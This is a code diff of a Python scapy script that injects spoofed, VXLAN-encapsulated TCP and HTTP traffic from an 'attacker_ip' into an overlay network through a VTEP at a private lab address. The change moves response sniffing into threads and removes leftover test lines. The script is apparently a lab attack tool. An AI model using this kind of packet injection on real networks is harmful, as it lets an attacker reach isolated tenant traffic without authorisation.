@@ -12,6 +12,9 @@ from scapy.layers.http import *
 from scapy.layers import http
 import random
 import sys
+import threading
+from threading import Thread
+import time
 
 
 vtep_dst = "192.168.10.149"
@@ -76,54 +79,65 @@ sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flag
 #Send ACK
 out_ack = send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A'))
 
-#Send the HTTP GET
-send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
-
-#Get the HTTP Reply
-sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
-sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
-
-
-
-
-
 
 ### Print the layers of the packet
-def get_packet_layers(packet):
-    counter = 0
-    while True:
-        layer = packet.getlayer(counter)
-        if layer is None:
-            break
+# def get_packet_layers(packet):
+#     counter = 0
+#     while True:
+#         layer = packet.getlayer(counter)
+#         if layer is None:
+#             break
 
-        yield layer
-        counter += 1
+#         yield layer
+#         counter += 1
 
-for layer in get_packet_layers(http_answer):
-    print (layer.name)
+# for layer in get_packet_layers(http_answer):
+#     print (layer.name)
 
 #ls(http_answer)
 #print(http_answer.getlayer(IP).src)
 #print(http_answer.getlayer(HTTP).Transfer-Encoding)
 
 
+
+class myThread (threading.Thread):
+   def __init__(self):
+      threading.Thread.__init__(self)
+   def run(self):
+      sniff_http_response_thread()
+
+
+def custom_action(packet):
+    global thepacket
+    thepacket = str(packet)
+    return
+
+#Sniff HTTP Response Function
+def sniff_http_response_thread():
+    sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
+    return
+
+#create sniff thread
+sniffer = myThread()
+sniffer1 = myThread()
+
+# Start sniff thread
+sniffer.start()
+sniffer1.start()
+
+#let the sniffer some time to activate
+time.sleep(1)
+
+# send HTTP Request
+send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
+
+time.sleep(5)
+
 http_layer = http_answer.getlayer(http.HTTPResponse)
 ip_layer = http_answer.getlayer(IP)
 raw = http_answer.getlayer(Raw)
 print '\n{0[src]} Sends a response on {1[Date]} and Server {1[Server]} and Content is \r\n\r\n'.format(ip_layer.fields, http_layer.fields)
 print(full_http_response)
-
-
-#test
-
-s1 = "ben"
-s2 = "cool"
-s3 = s1
-s3 += s2
-
-print(s3)
-
-
 
 
 
